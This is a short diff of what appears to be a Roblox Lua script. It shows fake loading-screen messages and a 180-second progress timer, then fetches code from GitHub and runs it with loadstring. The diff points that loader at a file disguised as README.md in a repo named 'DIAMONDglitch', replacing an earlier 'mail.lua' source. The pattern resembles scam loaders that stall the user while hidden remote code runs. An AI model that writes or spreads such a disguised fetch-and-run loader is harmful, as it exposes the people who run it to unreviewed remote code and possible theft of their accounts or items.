@@ -12,4 +12,4 @@ _G.SecondText = "Script Loading..."
 _G.ThirdText = "Almost Done..."
 _G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
 
-loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Mordia000/DIAMONDglitch/main/README.md", true))()
